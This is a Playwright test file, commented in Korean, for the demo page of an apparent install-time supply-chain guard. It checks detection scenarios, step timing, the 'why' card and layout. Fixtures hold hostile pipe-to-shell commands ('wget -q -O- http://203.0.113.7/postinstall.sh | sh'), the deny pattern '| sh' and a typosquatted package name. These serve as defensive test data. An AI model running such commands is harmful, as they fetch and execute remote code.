import type { Page } from '@playwright/test';
import type { DemoRun, InstallSession } from '../src/lib/types';
import { expect, SHOTS, test } from './fixtures';
import { demoRun } from './mock-backend';

// R3 11/04 — React 이식 3단계: 「시연」 페이지(/demo). 목업 shared/demo-page.js(11/04e B) · 회귀 demo-page-1104 가 확인하는 동작을 React 로 옮겼는지 본다.
//   메뉴 노출 조건 · 고정 자리 / 시나리오 8개 · 예상 결과 / 5단계 흐름(도착 시각 · +N ms · 커널 이벤트 수 · 최근 줄) / 「왜」 카드 /
//   대조군 통과 / 연쇄 1/3 / 실행 중 잠김 · 409 / 필드 없음 「정보 없음」 / 자동 이동 없음 / 1920×1080 한 화면 / 다크 / 390
// 시간에 따라 다시 그려지는 요소는 단언마다 새로 찾는다(locator).

const SCRATCH = process.env.R3_SHOTS || SHOTS;
const PAGE = '[data-part="demo-page"]';
const W = '[data-part="why"]';
const NAV = 'aside[data-part="sidebar"] nav';
const STEPS = ['start', 'events', 'match', 'evidence', 'outcome'];

async function goDemo(page: Page) {
  await page.goto('/demo');
  await expect(page.locator(PAGE)).toBeVisible();
  // 실시간 연결 표시는 768 이상 머리에만 보인다
  if ((page.viewportSize()?.width ?? 1440) >= 768) await expect(page.getByText('실시간 연결됨')).toBeVisible();
  else await page.waitForTimeout(400);
}
async function runScenario(page: Page, k: string) {
  await page.locator(`[data-scenario="${k}"]`).click();
  await page.locator('[data-action="demo-run"]').click();
}
const outcome = (page: Page) => page.locator('[data-part="demo-outcome"]');
const waitDone = (page: Page) => expect(outcome(page)).toHaveAttribute('data-outcome', /^(?!running$).+/, { timeout: 10_000 });
const stepStates = (page: Page) =>
  page.locator('[data-part="demo-steps"] > li[data-step]').evaluateAll((els) => els.map((e) => [(e as HTMLElement).dataset.step, (e as HTMLElement).dataset.state]));

test.describe('R3 시연 페이지 — 메뉴 · 자리', () => {
  test('시연 꺼짐 · 조회자: 사이드바에 「시연」 없음 · 주소로 오면 안내(관리자 + /api/info.demo 일 때만)', async ({ page, backend }) => {
    // 꺼짐(기본): 메뉴 없음 · 주소로 오면 안내
    await page.goto('/');
    await expect(page.locator(`${NAV} a[href="/"]`)).toBeVisible();
    await expect(page.locator(`${NAV} a[href="/demo"]`)).toHaveCount(0);
    await page.goto('/demo');
    await expect(page.getByTestId('page-title')).toHaveText('시연');
    await expect(page.locator('[data-part="demo-denied"]')).toContainText('시연을 쓸 수 없습니다');
    await expect(page.locator(PAGE)).toHaveCount(0);
    // 조회자: 서버 시연이 켜져 있어도 메뉴 없음 · 주소 진입 안내
    backend.enableDemo();
    backend.auth.asViewer();
    await page.goto('/');
    await expect(page.locator(`${NAV} a[href="/"]`)).toBeVisible();
    await expect(page.locator(`${NAV} a[href="/demo"]`)).toHaveCount(0);
    await page.goto('/demo');
    await expect(page.locator('[data-part="demo-denied"]')).toContainText('시연을 쓸 수 없습니다');
    await expect(page.locator('[data-part="demo-denied"]')).toContainText('관리자');
  });

  test('관리자 + 시연 켜짐: 「시연」 = 대시보드 바로 아래 고정(길게 눌러 옮기기 대상 아님 · 저장 키에 없음 · 다른 묶음 순서와 무관)', async ({ page, backend }) => {
    backend.enableDemo();
    await page.goto('/');
    const link = page.locator(`${NAV} a[href="/demo"]`);
    await expect(link).toBeVisible();
    await expect(link).toContainText('시연');
    // 대시보드 아래 고정 줄(묶음 제목 없는 home) — 11/06 부터 대시보드 → 연동 → 시연, 정렬 대상 표시 없음(11/09 밤: 연동은 하위 메뉴 묶음)
    const home = page.locator(`${NAV} [data-nav-group="home"]`);
    const homeOrder = () => home.evaluate((g) => [...g.children].map((e) => e.getAttribute('href') ?? `sub:${e.getAttribute('data-nav-sub')}`));
    expect(await homeOrder()).toEqual(['/', 'sub:integration', '/demo']);
    await expect(link).not.toHaveAttribute('data-sort-scope', /.+/);
    const [d, l] = await Promise.all([page.locator(`${NAV} [data-nav-sub="integration"]`).boundingBox(), link.boundingBox()]);
    expect(l!.y).toBeGreaterThan(d!.y);
    expect(l!.y - d!.y).toBeLessThan(d!.height + 8);
    // 길게 눌러도 집히지 않고(0.4초 넘게) 저장 키에 들어가지 않는다
    await link.hover();
    await page.mouse.down();
    await page.waitForTimeout(600);
    await expect(page.locator('.sg-sort-picked')).toHaveCount(0);
    await page.mouse.up();
    await page.keyboard.press('Escape');
    const layout = await page.evaluate(() => localStorage.getItem('supplyguard.layout'));
    expect(layout ?? '').not.toContain('demo');
    // 누르면 시연 페이지
    await page.goto('/');
    await link.click();
    await expect(page).toHaveURL(/\/demo$/);
    await expect(page.getByTestId('page-title')).toHaveText('시연');
    await expect(page.locator(PAGE)).toBeVisible();
    // 다른 묶음 순서를 바꿔도 시연은 그대로 대시보드 아래
    await page.evaluate(() => localStorage.setItem('supplyguard.layout', JSON.stringify({ v: 1, sidebar: { install: ['evaluation', 'scans', 'installs'] } })));
    await page.reload();
    await expect(page.locator(`${NAV} a[href="/demo"]`)).toBeVisible();
    expect(await homeOrder()).toEqual(['/', 'sub:integration', '/demo']);
  });
});

test.describe('R3 시연 페이지 — 시나리오 · 흐름 · 「왜」', () => {
  test.beforeEach(({ backend }) => {
    backend.enableDemo();
  });

  test('시나리오 8개(백엔드 순서) · 예상 결과 배지 · 고르면 설명 · 시작 → POST {scenario}', async ({ page, backend }) => {
    backend.demoStepMs = 5000;
    await goDemo(page);
    const keys = await page.locator('[data-scenario]').evaluateAll((els) => els.map((e) => (e as HTMLElement).dataset.scenario));
    expect(keys).toEqual(['all', 'shell', 'revshell', 'direct-ip', 'domain', 'dns-exfil', 'benign', 'chain']);
    const exp = await page
      .locator('[data-scenario]')
      .evaluateAll((els) =>
        Object.fromEntries(els.map((e) => [(e as HTMLElement).dataset.scenario, (e.querySelector('[data-part="expect"]') as HTMLElement | null)?.dataset.expect])),
      );
    expect(exp).toMatchObject({ shell: 'isolated', chain: 'isolated', benign: 'passed', all: 'isolated' });
    await expect(page.locator('[data-scenario="benign"] [data-part="expect"]')).toHaveText('통과 예상');
    await expect(page.locator('[data-scenario="shell"] [data-part="expect"]')).toHaveText('격리 예상');
    await page.locator('[data-scenario="chain"]').click();
    await expect(page.locator('[data-scenario="chain"]')).toHaveAttribute('aria-pressed', 'true');
    await expect(page.locator('[data-scenario="shell"]')).toHaveAttribute('aria-pressed', 'false');
    const desc = page.locator('[data-part="scenario-desc"]');
    await expect(desc).toContainText('dryRun');
    await expect(desc).toContainText('1단계');
    await expect(desc).toContainText('no-shell-download');
    await page.locator('[data-scenario="dns-exfil"]').click();
    await page.locator('[data-action="demo-run"]').click();
    const w = backend.writes().find((r) => r.path === '/demo/run')!;
    expect(JSON.parse(w.body!)).toEqual({ scenario: 'dns-exfil' });
    await expect(outcome(page)).toHaveAttribute('data-outcome', 'running');
    await expect(page.locator('[data-step="start"]')).toHaveAttribute('data-state', 'done');
  });

  test('shell: 5단계 차례로 — 도착 시각(초.밀리초) · 직전 대비 +N ms · 커널 이벤트 수 · 최근 줄(≤6, 위반 줄 강조) · 결과 격리', async ({ page, backend }) => {
    backend.demoStepMs = 700;
    await page.setViewportSize({ width: 1920, height: 1080 }); // 녹화 화면
    await goDemo(page);
    await runScenario(page, 'shell');
    await expect(outcome(page)).toHaveAttribute('data-outcome', 'running');
    await expect(page.locator('[data-col="flow"]')).toContainText('실행 중');
    const mid = await stepStates(page);
    expect(mid[0]).toEqual(['start', 'done']);
    expect(mid.slice(1).some(([, s]) => s === 'active' || s === 'todo')).toBe(true);
    await page.screenshot({ path: `${SCRATCH}/r3-running-1920.png` }).catch(() => {});
    await waitDone(page);
    expect(await stepStates(page)).toEqual(STEPS.map((k) => [k, 'done']));
    await expect(outcome(page)).toHaveAttribute('data-outcome', 'isolated');
    await expect(outcome(page)).toContainText('[격리] pipe-to-shell 위반');
    await expect(outcome(page)).toContainText(/탐지→kill [\d,]+ ms/);
    const times = await page
      .locator('[data-part="demo-steps"] > li[data-step]')
      .evaluateAll((els) =>
        els.map((e) => [
          (e as HTMLElement).dataset.at,
          (e as HTMLElement).dataset.deltaMs,
          e.querySelector('[data-part="step-at"]')?.textContent?.trim(),
          e.querySelector('[data-part="step-delta"]')?.textContent?.trim(),
        ]),
      );
    for (const t of times) {
      expect(Number.isNaN(Date.parse(t[0]!))).toBe(false);
      expect(t[2]).toMatch(/^\d\d:\d\d:\d\d\.\d{3}$/);
    }
    for (const t of times.slice(1)) {
      expect(t[1]).toMatch(/^\d+$/);
      expect(t[3]).toMatch(/^\+[\d,]+ ms$/);
    }
    for (let i = 1; i < times.length; i++) expect(Date.parse(times[i][0]!)).toBeGreaterThanOrEqual(Date.parse(times[i - 1][0]!));
    const n = Number((await page.locator('[data-part="event-count"]').textContent())!.replace(/[^\d]/g, ''));
    expect(n).toBeGreaterThanOrEqual(2);
    const lines = page.locator('[data-part="event-lines"] li');
    expect(await lines.count()).toBeGreaterThanOrEqual(2);
    expect(await lines.count()).toBeLessThanOrEqual(6);
    await expect(page.locator('[data-part="event-lines"] li.hit')).toContainText('wget');
    await expect(page.locator('[data-part="event-lines"] li').first()).toContainText('pip install');
    await expect(page.locator('[data-step="match"]')).toContainText('pipe-to-shell');
    await expect(page.locator('[data-step="evidence"]')).toContainText(/로그 · 파일 변경 · 프로세스 보존됨\([\d,]+ ms\)/);
    await expect(page.locator('[data-step="outcome"]')).toContainText('[격리] 컨테이너 kill(종료 코드 137)');
    expect(await page.locator(PAGE).innerText(), '11/09 「—」 없음').not.toContain('—');
    await page.screenshot({ path: `${SCRATCH}/r3-isolated-1920.png` });
  });

  test('「왜」 카드: 무엇을(패키지 · 컨테이너 · comm/pid) · 왜(규칙 · 판정 · 조건 · 원문 강조 CodeWindow) · 어떻게(증거 3종 · ms) · 보고서 · 정책 링크', async ({
    page,
    backend,
  }) => {
    backend.demoStepMs = 200;
    await goDemo(page);
    await runScenario(page, 'shell');
    await waitDone(page);
    const run = backend.demo.last!;
    await expect(page.locator('[data-col="why"] h2')).toHaveText('왜 격리됐나');
    const what = page.locator(`${W} [data-why="what"]`);
    await expect(what).toContainText('pip ./reqeusts');
    await expect(what).toContainText(run.container);
    await expect(what).toContainText('sh · pid 4242');
    await expect(page.locator(`${W} [data-part="why-rule"]`)).toHaveText('pipe-to-shell');
    await expect(page.locator(`${W} [data-why="why"]`)).toContainText('격리');
    await expect(page.locator(`${W} [data-part="why-condition"]`)).toHaveText('인자 | sh · | bash');
    // 원문 = R1 CodeWindow(body div · wrap · shell) · 걸린 부분 mark
    const cw = page.locator(`${W} [data-codewin]`);
    await expect(cw).toHaveAttribute('data-lang', 'shell');
    await expect(cw).toHaveAttribute('data-wrap', '1');
    await expect(cw.locator('div.cw-body')).toBeVisible();
    await expect(page.locator(`${W} [data-part="why-event"] mark`)).toHaveText('| sh');
    await expect(page.locator(`${W} [data-part="why-event"]`)).toContainText('wget -qO- http://203.0.113.7/p.sh');
    await expect(page.locator(`${W} .why-reason`)).toContainText('금지 인자 패턴: | sh');
    // 어떻게
    await expect(page.locator(`${W} [data-part="why-evidence"] [data-ev]`)).toHaveCount(3);
    expect(await page.locator(`${W} [data-part="why-evidence"] [data-ev]`).evaluateAll((els) => els.map((e) => (e as HTMLElement).dataset.ev))).toEqual([
      'logs',
      'changes',
      'processes',
    ]);
    await expect(page.locator(`${W} [data-ev="logs"]`)).toContainText('3줄');
    await expect(page.locator(`${W} [data-ev="changes"]`)).toContainText('A /tmp/p.sh');
    await expect(page.locator(`${W} [data-part="evidence-ms"]`)).toContainText('295 ms');
    await expect(page.locator(`${W} [data-part="kill-ms"]`)).toContainText('420 ms');
    // 링크
    const caseId = backend.installs.find((s) => s.id === run.installId)!.caseId!;
    await expect(page.locator(`${W} [data-action="open-report"]`)).toHaveAttribute('href', `/report?case=${caseId}`);
    await expect(page.locator(`${W} [data-action="open-policy"]`)).toHaveAttribute('href', '/policies?id=pipe-to-shell');
    await page.locator(`${W} [data-action="open-report"]`).click();
    await expect(page).toHaveURL(new RegExp(`/report\\?case=${caseId}$`));
    await expect(page.getByTestId('report')).toBeVisible();
    // 돌아오면 마지막 실행 그대로
    await page.goto('/demo');
    await expect(outcome(page)).toHaveAttribute('data-outcome', 'isolated');
    await expect(page.locator(`${W} [data-part="why-rule"]`)).toHaveText('pipe-to-shell');
  });

  test('대조군 benign: 위반 없음 → 「통과」 · 증거 단계 건너뜀 · 「왜」 카드 「걸린 규칙 없음」', async ({ page, backend }) => {
    backend.demoStepMs = 200;
    await page.setViewportSize({ width: 1920, height: 1080 }); // 녹화 화면
    await goDemo(page);
    await runScenario(page, 'benign');
    await waitDone(page);
    await expect(outcome(page)).toHaveAttribute('data-outcome', 'passed');
    await expect(outcome(page)).toContainText('통과');
    expect(Object.fromEntries(await stepStates(page))).toEqual({ start: 'done', events: 'done', match: 'done', evidence: 'skip', outcome: 'done' });
    await expect(page.locator('[data-step="match"]')).toContainText('[통과] 설치 중 행동에 위반 사항 없음');
    await expect(page.locator('[data-step="evidence"]')).toContainText('건너뜀');
    await expect(page.locator('[data-col="why"] h2')).toHaveText('왜 통과했나');
    await expect(page.locator(W)).toContainText('걸린 규칙 없음');
    await expect(page.locator(`${W} [data-part="why-evidence"]`)).toContainText('격리하지 않아 증거를 모으지 않았습니다');
    expect(await page.locator(PAGE).innerText(), '11/09 「—」 없음').not.toContain('—');
    await expect(page.locator(`${W} [data-action="open-policy"]`)).toHaveCount(0);
    await expect(page.locator(`${W} [data-action="open-report"]`)).toHaveAttribute('href', `/report?install=${backend.demo.last!.installId}`);
    await page.screenshot({ path: `${SCRATCH}/r3-passed-1920.png` });
  });

  test('연쇄 chain: 기본 정책 no-shell-download 가 1단계에서 격리 · 「연쇄 진행 1/3(dryRun 연쇄 규칙 chain-download-secrets)」 · 단계 3개(1단계만 이벤트)', async ({
    page,
    backend,
  }) => {
    backend.demoStepMs = 200;
    await page.setViewportSize({ width: 1920, height: 1080 }); // 녹화 화면
    await goDemo(page);
    await runScenario(page, 'chain');
    await waitDone(page);
    await expect(outcome(page)).toHaveAttribute('data-outcome', 'isolated');
    await expect(outcome(page)).toContainText('[격리] no-shell-download 위반');
    await expect(page.locator('[data-part="seq-line"]')).toHaveText('기본 정책이 1단계에서 먼저 막음 · 연쇄 진행 1/3(dryRun 연쇄 규칙 chain-download-secrets)');
    await expect(page.locator(`${W} [data-part="why-rule"]`)).toHaveText('no-shell-download');
    const steps = await page
      .locator('[data-part="seq-steps"] li')
      .evaluateAll((els) => els.map((e) => [(e as HTMLElement).dataset.kind, (e as HTMLElement).dataset.matched, e.textContent]));
    expect(steps.map((s) => s[0])).toEqual(['exec', 'connect', 'open']);
    expect(steps.map((s) => s[1])).toEqual(['true', 'false', 'false']);
    expect(steps[0][2]).toContain('wget');
    expect(steps[1][2]).toContain('이어지지 않음');
    await expect(page.locator('[data-part="seq"]')).toContainText('dryRun');
    await expect(page.locator('[data-part="seq"]')).toContainText('진행 1/3');
    await expect(page.locator(`${W} [data-part="why-event"] mark`)).toHaveText('wget');
    await page.screenshot({ path: `${SCRATCH}/r3-chain-1920.png` });
  });

  test('실행 중 잠김: 단추 · 시나리오 잠김 + 이유(동시 1개 · 90초 · N초 경과) · 다른 곳에서 시작해도 폴링으로 잠김 · 끝나면 풀림', async ({ page, backend }) => {
    backend.demoStepMs = 1500;
    await goDemo(page);
    await runScenario(page, 'revshell');
    await expect(page.locator('[data-action="demo-run"]')).toBeDisabled();
    await expect(page.locator('[data-action="demo-run"]')).toContainText('실행 중…');
    await expect(page.locator('[data-scenario="shell"]')).toBeDisabled();
    await expect(page.locator('[data-part="run-note"]')).toContainText(/실행 중입니다\(동시 1개 · 최대 90초, \d+초 경과\)\. 끝나면 다시 시작할 수 있습니다\./);
    await waitDone(page);
    await expect(page.locator('[data-action="demo-run"]')).toBeEnabled();
    await expect(page.locator('[data-action="demo-run"]')).toContainText('시연 시작');
    // 다른 곳(다른 브라우저 · 사람)에서 시작 — 화면은 폴링으로 알아챈다
    const other: DemoRun = demoRun('shell', 'ins-0012');
    other.startedAt = new Date().toISOString();
    backend.demo.running = other;
    await expect(page.locator('[data-action="demo-run"]')).toBeDisabled({ timeout: 8000 });
    await expect(page.locator('[data-part="run-note"]')).toContainText('실행 중');
    backend.demo.running = null;
    backend.demo.last = { ...other, status: 'finished', finishedAt: new Date().toISOString(), exitCode: 0 };
    await expect(page.locator('[data-action="demo-run"]')).toBeEnabled({ timeout: 8000 });
  });

  test('409: 화면이 모르는 사이 시작된 실행 → 「이미 실행 중」 띠 + 그 실행을 보인다 · 503 Docker 안내', async ({ page, backend, allowConsole }) => {
    allowConsole(/Failed to load resource: the server responded with a status of (409|503)/);
    await goDemo(page);
    const other = demoRun('shell', 'ins-0012');
    other.startedAt = new Date().toISOString();
    backend.demo.running = other;
    await page.locator('[data-action="demo-run"]').click();
    await expect(page.locator('[data-part="demo-error"]')).toContainText('이미 실행 중');
    await expect(page.locator('[data-action="demo-run"]')).toBeDisabled();
    await expect(page.locator('[data-col="flow"]')).toContainText('외부 스크립트 실행 + 비밀 파일 접근'); // 409 본문 running(shell)
    await expect(page.locator('[data-why="what"]')).toContainText(other.container);
    // 끝나면 띠가 사라지고 다시 시작할 수 있다
    backend.demo.running = null;
    backend.demo.last = { ...other, status: 'finished', finishedAt: new Date().toISOString(), exitCode: 137 };
    await expect(page.locator('[data-action="demo-run"]')).toBeEnabled({ timeout: 8000 });
    await expect(page.locator('[data-part="demo-error"]')).toHaveCount(0);
    backend.demoDown = true;
    await page.locator('[data-action="demo-run"]').click();
    await expect(page.locator('[data-part="demo-error"]')).toContainText('Docker 에 연결할 수 없습니다');
    await expect(page.locator('[data-action="demo-run"]')).toBeEnabled();
  });

  test('필드 없음: explain.decidedBy 에 condition 없음 · 세션 isolation 없음 · 증거 없음 → 그 칸만 「정보 없음」(나머지는 그대로)', async ({ page, backend }) => {
    const now = Date.now();
    const at = (ms: number) => new Date(now - 60_000 + ms).toISOString();
    const ctr = 'sg-install-demo-1';
    const ev = {
      kind: 'exec' as const,
      comm: 'sh',
      pid: 4242,
      args: 'sh -c wget -q -O- http://203.0.113.7/postinstall.sh | sh',
      timestamp: at(1200),
      containerName: ctr,
      containerId: 'c1',
      imageName: 'python:3.12-slim',
    };
    const session: InstallSession = {
      id: 'ins-0101',
      manager: 'pip',
      packages: ['./reqeusts'],
      container: ctr,
      image: 'python:3.12-slim',
      startedAt: at(0),
      finishedAt: at(3000),
      exitCode: 137,
      status: 'isolated',
      caseId: null,
      activity: { kinds: { exec: 2, open: 3, connect: 1, dns: 0 }, hosts: [], programs: [] },
      violations: [{ event: ev, matched: true, ruleId: 'pipe-to-shell', action: 'kill', enforced: true, reason: '금지 인자 패턴: | sh', count: 1 }],
      isolation: null,
    };
    backend.installs.unshift(session);
    backend.demo.last = {
      id: 'demo-1',
      scenario: 'shell',
      container: ctr,
      installId: 'ins-0101',
      startedAt: at(0),
      finishedAt: at(3000),
      status: 'finished',
      exitCode: 137,
      simulated: false,
      explain: {
        decidedBy: {
          ruleId: 'pipe-to-shell',
          description: '내려받은 내용을 바로 셸에 넘기는 패턴',
          condition: '',
          action: 'kill',
          dryRun: false,
          enforced: true,
          reason: '금지 인자 패턴: | sh',
          event: { kind: 'exec', timestamp: ev.timestamp, comm: 'sh', pid: 4242, args: ev.args, path: '', dstIp: '', dstPort: 0, dstHost: '', qtype: '' },
        },
        sequence: null,
      },
    };
    await goDemo(page);
    await expect(outcome(page)).toHaveAttribute('data-outcome', 'isolated');
    await expect(page.locator(`${W} [data-part="why-rule"]`)).toHaveText('pipe-to-shell');
    await expect(page.locator(`${W} [data-why="why"]`)).toContainText('내려받은 내용을 바로 셸에 넘기는 패턴');
    await expect(page.locator(`${W} [data-part="why-condition"]`)).toContainText('정보 없음');
    await expect(page.locator(`${W} [data-why="what"]`)).toContainText('sh · pid 4242');
    await expect(page.locator(`${W} [data-why="what"]`)).toContainText('pip ./reqeusts');
    await expect(page.locator(`${W} [data-part="why-event"] mark`)).toHaveText('| sh');
    await expect(page.locator(`${W} [data-part="why-evidence"]`)).toContainText('정보 없음', { timeout: 8000 });
    await expect(page.locator(`${W} [data-part="evidence-ms"]`)).toContainText('정보 없음');
    await expect(page.locator(`${W} [data-part="kill-ms"]`)).toContainText('정보 없음');
    await expect(page.locator('[data-step="evidence"]')).toContainText('정보 없음');
    await expect(page.locator(`${W} [data-action="open-report"]`)).toHaveAttribute('href', '/report?install=ins-0101');
    // 실시간 스트림에 이 컨테이너 이벤트가 없으면 세션의 위반 이벤트로 최근 줄을 채운다 · 이벤트 수는 세션 activity 합
    await expect(page.locator('[data-part="event-lines"] li')).toHaveCount(1);
    await expect(page.locator('[data-part="event-count"]')).toContainText('6');
  });

  test('옛 백엔드(explain 없음): 세션 위반으로 「왜」를 채우고 조건만 「정보 없음」', async ({ page, backend }) => {
    backend.demoExplain = false;
    backend.demoStepMs = 200;
    await goDemo(page);
    await runScenario(page, 'shell');
    await waitDone(page);
    await expect(outcome(page)).toHaveAttribute('data-outcome', 'isolated');
    await expect(page.locator(`${W} [data-part="why-rule"]`)).toHaveText('pipe-to-shell');
    await expect(page.locator(`${W} [data-part="why-condition"]`)).toContainText('정보 없음');
    await expect(page.locator(`${W} [data-part="why-event"] mark`)).toHaveText('| sh');
  });

  test('첫 위반이 나와도 설치 시트로 자동 이동하지 않는다(녹화 중 페이지 고정)', async ({ page, backend }) => {
    backend.demoStepMs = 400;
    await goDemo(page);
    await runScenario(page, 'shell');
    await expect(page.locator('[data-part="event-lines"] li.hit')).toBeVisible();
    await waitDone(page);
    await page.waitForTimeout(800);
    await expect(page).toHaveURL(/\/demo$/);
    await expect(page.locator('[data-sheet="install"]')).toHaveCount(0);
    await expect(page.locator(PAGE)).toBeVisible();
  });
});

test.describe('R3 시연 페이지 — 화면 틀', () => {
  test.beforeEach(({ backend }) => {
    backend.enableDemo();
    backend.demoStepMs = 200;
  });

  test('1920×1080 한 화면: 문서 · main 스크롤 0 · 세 열 화면 안 · 안쪽 스크롤 없음 · 글자 12px 이상(배지 11.5) · 1440×900 도 문서 스크롤 0', async ({ page }) => {
    await page.setViewportSize({ width: 1920, height: 1080 });
    await goDemo(page);
    await runScenario(page, 'shell');
    await waitDone(page);
    await expect(page.locator(`${W} [data-ev]`)).toHaveCount(3);
    const r = await page.evaluate(() => {
      const se = document.scrollingElement!;
      const main = document.querySelector('main')!;
      const cols = [...document.querySelectorAll('[data-part="demo-page"] > [data-col]')].map((e) => {
        const b = e.getBoundingClientRect();
        return [(e as HTMLElement).dataset.col, b.top >= 0 && b.bottom <= innerHeight && b.right <= innerWidth && b.left >= 0];
      });
      const small = [...document.querySelectorAll('[data-part="demo-page"] *')]
        .filter(
          (e) =>
            e.getClientRects().length &&
            [...e.childNodes].some((n) => n.nodeType === 3 && n.textContent!.trim()) &&
            parseFloat(getComputedStyle(e).fontSize) < (e.closest('.badge, [data-kind-badge], .sg-pill') ? 11.5 : 12),
        )
        .map((e) => `${e.tagName}.${e.className}:${getComputedStyle(e).fontSize}`);
      const inner = [...document.querySelectorAll('[data-part="demo-page"] *')]
        .filter((e) => /(auto|scroll)/.test(getComputedStyle(e).overflowY) && e.scrollHeight > e.clientHeight + 1)
        .map((e) => String(e.className));
      return { doc: se.scrollHeight - innerHeight, docW: se.scrollWidth - innerWidth, main: main.scrollHeight - main.clientHeight, cols, small: small.slice(0, 5), inner };
    });
    expect(r.doc).toBeLessThanOrEqual(0);
    expect(r.docW).toBeLessThanOrEqual(0);
    expect(r.main).toBeLessThanOrEqual(0);
    expect(r.cols).toEqual([
      ['scenarios', true],
      ['flow', true],
      ['why', true],
    ]);
    expect(r.small).toEqual([]);
    expect(r.inner).toEqual([]);
    await page.setViewportSize({ width: 1440, height: 900 });
    await page.waitForTimeout(300);
    const d = await page.evaluate(() => [
      document.scrollingElement!.scrollHeight - innerHeight,
      document.querySelector('main')!.scrollHeight - document.querySelector('main')!.clientHeight,
    ]);
    expect(d).toEqual([0, 0]);
    await page.screenshot({ path: `${SCRATCH}/r3-isolated-1440.png` });
  });

  test('다크: 토큰 색(바탕 · 결과 띠 · 코드 창 어두운 바탕) · 단계 점 색', async ({ page }) => {
    await page.addInitScript(() => localStorage.setItem('supplyguard.theme', 'dark'));
    await page.setViewportSize({ width: 1920, height: 1080 });
    await goDemo(page);
    expect(await page.evaluate(() => document.documentElement.dataset.theme)).toBe('dark');
    await runScenario(page, 'shell');
    await waitDone(page);
    const c = await page.evaluate(() => {
      const probe = (v: string, p: 'color' | 'backgroundColor') => {
        const e = document.createElement('i');
        e.style[p] = `var(${v})`;
        document.body.append(e);
        const out = getComputedStyle(e)[p];
        e.remove();
        return out;
      };
      const bg = (s: string) => getComputedStyle(document.querySelector(s)!).backgroundColor;
      return {
        col: bg('[data-col="flow"] > section'),
        surface: probe('--surface', 'backgroundColor'),
        oc: bg('[data-part="demo-outcome"]'),
        danger: probe('--danger-soft', 'backgroundColor'),
        code: bg('[data-part="why"] .cw-body'),
        codeBg: probe('--code-bg', 'backgroundColor'),
        dot: bg('[data-step="match"] .flow-dot'),
        ok: probe('--ok', 'backgroundColor'),
      };
    });
    expect(c.col).toBe(c.surface);
    expect(c.oc).toBe(c.danger);
    expect(c.code).toBe(c.codeBg);
    expect(c.dot).toBe(c.ok);
    await page.screenshot({ path: `${SCRATCH}/r3-isolated-dark.png` });
  });

  test('390: 1열(시나리오 → 흐름 → 왜) · 가로 넘침 없음 · 실행 · 결과까지 닿는다', async ({ page }) => {
    await page.setViewportSize({ width: 390, height: 844 });
    await goDemo(page);
    await runScenario(page, 'benign');
    await waitDone(page);
    await expect(outcome(page)).toHaveAttribute('data-outcome', 'passed');
    const r = await page.evaluate(() => {
      const cols = [...document.querySelectorAll('[data-part="demo-page"] > [data-col]')].map((e) => e.getBoundingClientRect());
      return {
        docW: document.documentElement.scrollWidth - innerWidth,
        xs: cols.map((b) => Math.round(b.left)),
        ys: cols.map((b) => Math.round(b.top)),
        ws: cols.map((b) => Math.round(b.width)),
        // 패널이 내용을 자르지 않는다(1열에서는 열이 내용 높이 그대로)
        clipped: [...document.querySelectorAll('[data-part="demo-page"] > [data-col] > section')].map((e) => e.scrollHeight - e.clientHeight),
      };
    });
    expect(r.docW).toBeLessThanOrEqual(0);
    expect(new Set(r.xs).size).toBe(1);
    expect(r.ys[0]).toBeLessThan(r.ys[1]);
    expect(r.ys[1]).toBeLessThan(r.ys[2]);
    for (const w of r.ws) expect(w).toBeLessThanOrEqual(390);
    expect(r.clipped).toEqual([0, 0, 0]);
    await page.locator('[data-col="why"]').scrollIntoViewIfNeeded();
    await expect(page.locator(W)).toContainText('걸린 규칙 없음');
    await page.locator('[data-part="demo-outcome"]').scrollIntoViewIfNeeded();
    await expect(page.locator('[data-part="demo-outcome"]')).toBeInViewport();
    await page.locator('[data-col="flow"]').scrollIntoViewIfNeeded();
    await page.screenshot({ path: `${SCRATCH}/r3-passed-390.png` });
  });
});
